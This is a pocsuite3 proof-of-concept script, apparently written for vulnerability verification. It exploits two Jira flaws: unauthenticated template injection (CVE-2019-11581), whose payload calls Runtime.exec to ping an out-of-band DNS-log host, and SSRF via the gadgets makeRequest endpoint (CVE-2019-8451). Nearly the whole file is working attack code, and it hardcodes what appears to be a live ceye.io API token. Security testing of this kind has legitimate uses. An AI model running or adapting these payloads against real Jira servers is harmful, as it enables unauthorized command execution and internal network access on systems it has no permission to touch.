#!/usr/bin/env python
#coding=utf-8

import random
import json
from string import ascii_letters
import time

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

'''
CVE-2019-11581
设置=> 系统=> 编辑设置=> 联系管理员表单处选择“开”
'''
class Jira_RCE_POC(POCBase):
    vulID = 'Jira-CVE-2019-11581'
    appName = 'Jira'
    appVersion = '''
    4.4.x
    5.x.x
    6.x.x
    7.0.x
    7.1.x
    7.2.x
    7.3.x
    7.4.x
    7.5.x
    7.6.x < 7.6.14
    7.7.x
    7.8.x
    7.9.x
    7.10.x
    7.11.x
    7.12.x
    7.13.x < 7.13.5
    8.0.x < 8.0.3
    8.1.x < 8.1.2
    8.2.x < 8.2.3
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-07-10'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-02-17'  # 编写 PoC 的日期
    updateDate = '2020-02-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw']  # 漏洞地址来源,0day不用写
    name = 'Jira未授权服务端模板注入'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    http_proxy  = "http://127.0.0.1:8087"
    proxies = {"http": http_proxy, "https": http_proxy}


    def _verify(self):
        result={}

        vul_url = self.url
        
        target_url = vul_url + "/secure/ContactAdministrators.jspa"

        headers = {"X-Atlassian-Token": "no-check"}

        payload = "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ping {0}.{1}').waitFor()".format(self.BANNER, self.DOMAIN)
        qparams = (('from','JIRA@JIRA.com'),('subject',payload),('details','details'),('Send','Send'))

        
        try:
            req.post(target_url, headers = headers, data = qparams, proxies=self.proxies, verify=False, allow_redirects=False)
        except Exception as e:
            e.printStackTrace()
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)

    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            

    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


'''
CVE-2019-8451
'''
class Jira_SSRF_POC(POCBase):
    vulID = 'Jira-CVE-2019-8451'
    appName = 'Jira'
    appVersion = '''version < 8.4.0'''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.OTHER # 没有SSRF类型？
    vulDate = '2019-09-23'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-02-24'  # 编写 PoC 的日期
    updateDate = '2020-02-24'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/_Tsq9p1pQyszJt2VaXd61A']  # 漏洞地址来源,0day不用写
    name = 'Jira未授权SSRF'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    http_proxy  = "http://127.0.0.1:8087"
    proxies = {"http": http_proxy, "https": http_proxy}


    def _verify(self):
        result={}

        vul_url = self.url

        payload = 'ip.cn:80'     # 换成dnslog的地址
        
        target_url = "{0}/plugins/servlet/gadgets/makeRequest?url={0}@{1}".format(vul_url, payload)

        headers = {"X-Atlassian-Token": "no-check"}

        
        try:
            req.get(target_url, headers = headers, proxies=self.proxies, verify=False)
        except Exception as e:
            e.printStackTrace()
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)


    # 验证DNS已被解析
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            

    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register_poc(Jira_RCE_POC)    # CVE-2019-11581
register_poc(Jira_SSRF_POC)    # CVE-2019-8451
